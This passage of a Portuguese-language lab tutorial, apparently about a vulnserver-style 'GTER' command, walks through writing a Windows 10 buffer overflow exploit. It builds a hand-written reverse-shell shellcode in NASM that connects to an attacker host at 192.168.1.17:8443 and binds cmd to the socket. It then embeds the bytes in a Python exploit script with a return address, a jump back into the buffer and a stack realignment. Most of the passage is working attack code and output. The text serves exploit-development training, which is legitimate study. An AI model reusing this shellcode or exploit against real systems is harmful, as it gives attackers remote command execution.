+  <span class="kt">int</span>                 <span class="n">protocol</span><span class="p">,</span>
+  <span class="n">LPWSAPROTOCOL_INFOA</span> <span class="n">lpProtocolInfo</span><span class="p">,</span>
+  <span class="n">GROUP</span>               <span class="n">g</span><span class="p">,</span>
+  <span class="n">DWORD</span>               <span class="n">dwFlags</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>Temos que ter em mente que para utilizar as APIs em Assembly, a ordem das chamadas tem que ser inversa, ou seja, vamos começar pela “dwFlags” e terminar na chamada da WSASocketA(), e por fim armazená-la em EAX.</p>
+
+<p>Também precisamos saber o endereço da API no sistema alvo. Os endereços de funções não costumam mudar na mesma versão do Windows com os mesmos updates, portanto, como nosso alvo é o Windows 10 na versão 21H1 provavemlmente este exploit só vai funcionar em alvos com a mesma versão. Porém o processo de descoberta e desenvolvimento é o mesmo para todas as versões.</p>
+
+<p>Para descobrir os endereços que precisamos no OS, vamos utilizar o arwin que pode ser encontrado <a href="https://vividmachines.com/shellcode/arwin.c">aqui</a>.</p>
+
+<p><img src="/img/std/winbof/winbof-39.png" alt="Enumaração do comando." /></p>
+
+<p>Já sabemos o endereço da API no OS, vamos iniciar nosso codigo em assembly no próprio Kali.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; WSASocketA()</span>
+
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'dwFlags' que pode ser nulo</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'g' que pode ser nulo</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'lpProtocolInfo' que pode ser nulo</span>
+<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">6</span>               <span class="c1">; Inserindo valor 6 no Protocol (IPPROTO=6)</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'protocol'</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">; Incrementando 1 no EBX zerado 'type: SOCK_STREAM=1'</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'type'</span>
+<span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">; Incrementando 1 ao EBX que ja tem valor 1 'af: AF_INET=2'</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o parametro 'af'</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x76e67140</span>     <span class="c1">; Endereco da WSASocketA() no Win10 21H1</span>
+<span class="nf">call</span> <span class="nb">ebx</span>                <span class="c1">; Chamada para WSASocketA()</span>
+<span class="nf">xchg</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esi</span>           <span class="c1">; Salvando o socket em ESI</span>
+
+</code></pre></div></div>
+
+<p>Agora precisamos fazer a chamada para a API connect() cuja documentação pode ser encontrada <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">aqui</a>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">WSAAPI</span> <span class="nf">connect</span><span class="p">(</span>
+  <span class="n">SOCKET</span>         <span class="n">s</span><span class="p">,</span>
+  <span class="k">const</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span>
+  <span class="kt">int</span>            <span class="n">namelen</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>Cujo parâmetro “sockaddr” segue a seguinte ordem:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sockaddr</span> <span class="p">{</span>
+        <span class="n">ushort</span>  <span class="n">sa_family</span><span class="p">;</span>
+        <span class="kt">char</span>    <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Vamos encontrar o endereço da connect() em nosso OS.</p>
+
+<p><img src="/img/std/winbof/winbof-40.png" alt="Enumaração do comando." /></p>
+
+<p>Como em Assembly programamos em ordem inversa, o primeiro parâmetro a ser configurado na connect() é o “namelen”,que representa o endereço para onde a conexão será criada, ou seja, da nossa máquina atacante constituido por IP e PORTA, mas os valores tem que ser passados em hexadecimal e com os bytes em ordem inversa, como o IP do meu Kali é 192.168.1.17, teria que seguir a ordem 171168192.</p>
+
+<p>Podemos utilizar a função “hex()” do python para descobrir byte a byte do nosso endereço.</p>
+
+<p>Podemos criar um script em python para descobrir byte a byte do nosso endereço.</p>
+
+<p>ipToHex.py:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.17"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>E ele nos responde o IP byte a byte:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 ipToHex.py
+c0 a8 1 11
+</code></pre></div></div>
+
+<p>Como precisamos preencher o script emm little indian, a ntação fica: 0x1101a8c0.</p>
+
+<p>Agora vamos fazer o Assembly da função connect().</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; connect</span>
+
+<span class="nf">push</span> <span class="mh">0x1101a8c0</span>         <span class="c1">; Fazendo push do endereco de IP 192.168.1.17 em hexa</span>
+<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0xfb20</span>        <span class="c1">; Fazendo push da porta hex(8443)</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">add</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>               <span class="c1">; Inserindo o valor 2 em 'sa_family' (AF_INET=2)</span>
+<span class="nf">push</span> <span class="kt">word</span> <span class="nb">bx</span>            <span class="c1">; Fazendo push para o parametro 'sa_family'</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; Apontando EBX para a estrutura sockaddr</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">16</span>            <span class="c1">; Tamanho do sockaddr: sa_family + sa_data = 16</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para o apontador do parametro 'name'</span>
+<span class="nf">push</span> <span class="nb">esi</span>                <span class="c1">; Fazendo push no socket para o parametro 's'</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x76e65710</span>     <span class="c1">; Endereco da connect() no Win10 21H1</span>
+<span class="nf">call</span> <span class="nb">ebx</span>                <span class="c1">; Chamando a connect()</span>
+
+</code></pre></div></div>
+
+<p>Por ultimo, precisamos fazer a chamada para a API CreateProcessA() cuja documentação pode ser encontrada <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">aqui</a>.</p>
+
+<p>Esta função é responsável por chamar o cmd.exe e enviar o STDIN, STDOUT e STDERR para o socket criado, é a função mais longa, pois seus parâmetros também chamam outras funções, porém a grande maioria pode ser nulo.</p>
+
+<p>Abaixo a estrutura da CreateProcessA():</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateProcessA</span><span class="p">(</span>
+  <span class="n">LPCSTR</span>                <span class="n">lpApplicationName</span><span class="p">,</span>
+  <span class="n">LPSTR</span>                 <span class="n">lpCommandLine</span><span class="p">,</span>
+  <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span>
+  <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
+  <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span>
+  <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>
+  <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span>
+  <span class="n">LPCSTR</span>                <span class="n">lpCurrentDirectory</span><span class="p">,</span>
+  <span class="n">LPSTARTUPINFOA</span>        <span class="n">lpStartupInfo</span><span class="p">,</span>
+  <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>Vamos encontrar o endereço da função no Win10 21H1.</p>
+
+<p><img src="/img/std/winbof/winbof-41.png" alt="Enumaração do comando." /></p>
+
+<p>Primeiro precisamos chamar a função “cmdA” que não existe, em seguida vamos usar a função “shr” (Shift Right) que vai mover os bytes à direita e zerar a origem, mais detalhes sobre a função <a href="https://www.plantation-productions.com/Webster/www.artofasm.com/DOS/ch06/CH06-3.html">aqui</a>. O resultado final será “cmd\x00” sem que precisemos digitar o null byte.</p>
+
+<p>Vamos ao código:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; CreateProcessA()</span>
+
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x646d6341</span>     <span class="c1">; Movendo 'cmda' para EBX evitando null byte</span>
+<span class="nf">shr</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">8</span>              <span class="c1">; Transformando EBX em 'cmd\x00'</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push do cmd</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; Fazendo ECX apontar para cmd</span>
+
+<span class="c1">; Preenchendo parametro '_STARTUPINFOA'</span>
+
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; Zerando EDX</span>
+<span class="nf">push</span> <span class="nb">esi</span>                <span class="c1">; Enviando hStdError para nosso socket</span>
+<span class="nf">push</span> <span class="nb">esi</span>                <span class="c1">; Enviando hStdOutput para nosso socket</span>
+<span class="nf">push</span> <span class="nb">esi</span>                <span class="c1">; Enviando hStdInput para nosso socket</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; cbReserved = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; wShowWindow = null</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; Zerando EAX</span>
+<span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x0101</span>          <span class="c1">; dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW</span>
+<span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; Fazendo push do dwFlags</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwFillAtribute = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwYCountChars = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dxXCountChars = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwYSize = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwXSize = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwY = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; dwX = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpTitle = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpDesktop = null</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpReserved = null</span>
+<span class="nf">add</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">44</span>              <span class="c1">; cb = 44</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; Fazendo push da _STARTUPINFOA para a stack</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; Fazendo o EAX apontar para ESP, onde esta a _STARTUPINFOA</span>
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; Zerando EDX</span>
+
+<span class="c1">; Preenchendo o parametro 'PROCESS_INFORMATION'</span>
+
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpProcessInformation</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpProcessInformation + 4</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpProcessInformation + 8</span>
+<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; lpProcessInformation + 12</span>
+
+<span class="c1">; Chamando a CreateProcessA()</span>
+
+<span class="nf">push</span> <span class="nb">esp</span>                <span class="c1">; lpProcessInformation</span>
+<span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; lpStartupInfo</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; lpCurrentDirectory = nulo</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; lpEnvironment = nulo</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; dwCreationFlags = nulo</span>
+<span class="nf">inc</span> <span class="nb">ebx</span>                 <span class="c1">; Incrementando 1 ao EBX zerado (bInheritHandles = True)</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Fazendo push para bInheritHandles</span>
+<span class="nf">dec</span> <span class="nb">ebx</span>                 <span class="c1">; Zerando EBX</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; lpThreadAttributes = nulo</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; lpProcessAttributes = nulo</span>
+<span class="nf">push</span> <span class="nb">ecx</span>                <span class="c1">; Tornando lpCommandline um pointer para 'cmd'</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; lpApplicationName = nulo</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x752b2d90</span>     <span class="c1">; Endereco da CreateProcessA() no Win10 21H1</span>
+<span class="nf">call</span> <span class="nb">ebx</span>                <span class="c1">; Chamando a CreateProcessA()</span>
+
+</code></pre></div></div>
+
+<p>Juntando todo o código Assembly que fizemos no arquivo shellcode.asm, podemos compilar com o nasm no próprio Kali para gerar o arquivo elf shellcode.o.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 shellcode.asm <span class="nt">-o</span> shellcode.o
+</code></pre></div></div>
+
+<p>Se utilizarmos o comando “objdump” podemos ver o disassembly do codigo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-d</span> shellcode.o <span class="nt">-M</span> intel
+
+shellcode.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:   31 db                   xor    ebx,ebx
+   2:   53                      push   ebx
+   3:   53                      push   ebx
+   4:   53                      push   ebx
+   5:   b3 06                   mov    bl,0x6
+   7:   53                      push   ebx
+   8:   31 db                   xor    ebx,ebx
+   a:   43                      inc    ebx
+   b:   53                      push   ebx
+   c:   43                      inc    ebx
+   d:   53                      push   ebx
+   e:   bb 40 71 e6 76          mov    ebx,0x76e67140
+  13:   ff d3                   call   ebx
+  15:   96                      xchg   esi,eax
+  16:   68 c0 a8 01 0c          push   0xc01a8c0
+  1b:   66 68 20 fb             pushw  0xfb20
+  1f:   31 db                   xor    ebx,ebx
+  21:   80 c3 02                add    bl,0x2
+  24:   66 53                   push   bx
+  26:   89 e3                   mov    ebx,esp
+  28:   6a 10                   push   0x10
+  2a:   53                      push   ebx
+  2b:   56                      push   esi
+  2c:   bb 10 57 e6 76          mov    ebx,0x76e65710
+  31:   ff d3                   call   ebx
+  33:   bb 41 63 6d 64          mov    ebx,0x646d6341
+  38:   c1 eb 08                shr    ebx,0x8
+  3b:   53                      push   ebx
+  3c:   89 e1                   mov    ecx,esp
+  3e:   31 d2                   xor    edx,edx
+  40:   56                      push   esi
+  41:   56                      push   esi
+  42:   56                      push   esi
+  43:   52                      push   edx
+  44:   52                      push   edx
+  45:   31 c0                   xor    eax,eax
+  47:   66 b8 01 01             mov    ax,0x101
+  4b:   50                      push   eax
+  4c:   52                      push   edx
+  4d:   52                      push   edx
+  4e:   52                      push   edx
+  4f:   52                      push   edx
+  50:   52                      push   edx
+  51:   52                      push   edx
+  52:   52                      push   edx
+  53:   52                      push   edx
+  54:   52                      push   edx
+  55:   52                      push   edx
+  56:   80 c2 2c                add    dl,0x2c
+  59:   52                      push   edx
+  5a:   89 e0                   mov    eax,esp
+  5c:   31 d2                   xor    edx,edx
+  5e:   52                      push   edx
+  5f:   52                      push   edx
+  60:   52                      push   edx
+  61:   52                      push   edx
+  62:   54                      push   esp
+  63:   50                      push   eax
+  64:   31 db                   xor    ebx,ebx
+  66:   53                      push   ebx
+  67:   53                      push   ebx
+  68:   53                      push   ebx
+  69:   43                      inc    ebx
+  6a:   53                      push   ebx
+  6b:   4b                      dec    ebx
+  6c:   53                      push   ebx
+  6d:   53                      push   ebx
+  6e:   51                      push   ecx
+  6f:   53                      push   ebx
+  70:   bb 90 2d 2b 75          mov    ebx,0x752b2d90
+  75:   ff d3                   call   ebx
+
+</code></pre></div></div>
+
+<p>Este é basicamente o shellcode que utilizaremos, mas precisamos sanitizá-lo para podermos utilizar em nosso sxript, vamos utilizar o próprio bash para isso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> shellcode.o <span class="nt">-M</span> intel | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
+<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>b3<span class="se">\x</span>06<span class="se">\x</span>53<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>43<span class="se">\x</span>53<span class="se">\x</span>43<span class="se">\x</span>53<span class="se">\x</span>bb<span class="se">\x</span>40<span class="se">\x</span>71<span class="se">\x</span>e6<span class="se">\x</span>76<span class="se">\x</span>ff<span class="se">\x</span>d3<span class="se">\x</span>96<span class="se">\x</span>68<span class="se">\x</span>c0<span class="se">\x</span>a8<span class="se">\x</span>01<span class="se">\x</span>0c<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>20<span class="se">\x</span>fb<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>02<span class="se">\x</span>66<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>53<span class="se">\x</span>56<span class="se">\x</span>bb<span class="se">\x</span>10<span class="se">\x</span>57<span class="se">\x</span>e6<span class="se">\x</span>76<span class="se">\x</span>ff<span class="se">\x</span>d3<span class="se">\x</span>bb<span class="se">\x</span>41<span class="se">\x</span>63<span class="se">\x</span>6d<span class="se">\x</span>64<span class="se">\x</span>c1<span class="se">\x</span>eb<span class="se">\x</span>08<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>50<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>80<span class="se">\x</span>c2<span class="se">\x</span>2c<span class="se">\x</span>52<span class="se">\x</span>89<span class="se">\x</span>e0<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>54<span class="se">\x</span>50<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>43<span class="se">\x</span>53<span class="se">\x</span>4b<span class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>51<span class="se">\x</span>53<span class="se">\x</span>bb<span class="se">\x</span>90<span class="se">\x</span>2d<span class="se">\x</span>2b<span class="se">\x</span>75<span class="se">\x</span>ff<span class="se">\x</span>d3
+
+</code></pre></div></div>
+
+<p>E temos um reverse shell de apenas 117 bytes que cabem perfeitamente no no espaço de 147 bytes!</p>
+
+<h2 id="atualizando-e-organizando-nosso-exploit">ATUALIZANDO E ORGANIZANDO NOSSO EXPLOIT</h2>
+
+<p>Com o shellcode em mãos, vamos atualizar nosso script.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.26"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">147</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xdb\x53\x53\x53\xb3\x06\x53\x31\xdb\x43\x53\x43\x53\xbb\x40\x71\xe6\x76\xff\xd3\x96\x68\xc0\xa8\x01\x0c\x66\x68\x20\xfb\x31\xdb\x80\xc3\x02\x66\x53\x89\xe3\x6a\x10\x53\x56\xbb\x10\x57\xe6\x76\xff\xd3\xbb\x41\x63\x6d\x64\xc1\xeb\x08\x53\x31\xd2\x56\x56\x56\x52\x52\x31\xc0\x66\xb8\x01\x01\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xc2\x2c\x52\x89\xe0\x31\xd2\x52\x52\x52\x52\x54\x50\x31\xdb\x53\x53\x53\x43\x53\x4b\x53\x53\x51\x53\xbb\x90\x2d\x2b\x75\xff\xd3</span><span class="s">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\x11\x50\x62</span><span class="s">"</span> <span class="c1"># endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe9\x64\xff\xff\xff</span><span class="s">"</span> <span class="c1"># salta para o primeiro buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="c1"># segundo buffer
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado! Cheque o netcat."</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Script pronto, vamos setar um netcat na porta 8443 que configuramos no Assembly e testar nosso exploit.</p>
+
+<p><img src="/img/std/winbof/winbof-42.png" alt="Enumaração do comando." /></p>
+
+<p>Como podemos ver, recebemos a conexão reversa, mas não recebemos o shell, precisamos rodar novamente no Immunity Debbuger para entender o que está ocorrendo. Vamos continuar com o breakpoint no nosso endereço de retorno, e avançar passo a passo com F7 até encontrarmos a inconsistência.</p>
+
+<p><img src="/img/std/winbof/winbof-43.png" alt="Enumaração do comando." /></p>
+
+<p>Se analisarmos este ponto da execução, veremos que o ESP está apontando para alguns bytes abaixo do fim do nosso shellcode. Isto significa que os PUSHs utilizados em nosso shellcode, fazem com que o ESP se aproxime cada vez mais dele até o ponto de sobrescrevê-lo. Pois ao ponto que a execução flui, no sentido crescente dos endereços de memória, a pilha cresce para trás.</p>
+
+<p>O que podemos fazer, é realinhar nossa stack, antes do envio do nosso shellcode, e isso pode ser feito com duas instruções: PUSH EAX e POP ESP.</p>
+
+<p>O PUSH EAX vai empurrar o valor corrente de EAX para o topo da stack, enquanto o POP ESP vai trazer de volta o valor de ESP, movendo o stack pointer acima do nosso shellcode e protegendo de ser sobrescrito.</p>
+
+<p>Para encontrar os opcodes corretos, podemos utilizar o msf-nasm_shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-nasm_shell 
+nasm <span class="o">&gt;</span> PUSH EAX
+00000000  50                push eax
+nasm <span class="o">&gt;</span> POP ESP
+00000000  5C                pop esp
+
+</code></pre></div></div>
+
+<p>Temos os opcodes \x50 e \x5c, vamos adicionálos acima de nosso shellcode.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">147</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xdb\x53\x53\x53\xb3\x06\x53\x31\xdb\x43\x53\x43\x53\xbb\x40\x71\xe6\x76\xff\xd3\x96\x68\xc0\xa8\x01\x0c\x66\x68\x20\xfb\x31\xdb\x80\xc3\x02\x66\x53\x89\xe3\x6a\x10\x53\x56\xbb\x10\x57\xe6\x76\xff\xd3\xbb\x41\x63\x6d\x64\xc1\xeb\x08\x53\x31\xd2\x56\x56\x56\x52\x52\x31\xc0\x66\xb8\x01\x01\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xc2\x2c\x52\x89\xe0\x31\xd2\x52\x52\x52\x52\x54\x50\x31\xdb\x53\x53\x53\x43\x53\x4b\x53\x53\x51\x53\xbb\x90\x2d\x2b\x75\xff\xd3</span><span class="s">"</span>
+
+<span class="n">alinhamento</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x50\x5c</span><span class="s">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">alinhamento</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
